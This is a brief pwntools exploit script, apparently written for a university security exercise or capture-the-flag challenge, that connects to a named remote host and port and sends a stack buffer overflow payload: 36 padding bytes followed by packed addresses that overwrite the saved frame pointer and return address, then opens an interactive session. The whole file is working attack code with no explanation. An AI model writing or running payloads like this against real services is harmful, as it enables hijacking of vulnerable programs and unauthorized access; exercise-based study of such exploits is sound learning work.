from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25155

target = p32(0x080487d9)
ebp = p32(0xff85dfa8)
offset = p32(0x804a021)

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./program/check', shell=True)

### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

input('')

# s.send(129 * b'a' + b'\n')
s.sendline(36*b"A" + offset + ebp + target)

s.interactive()
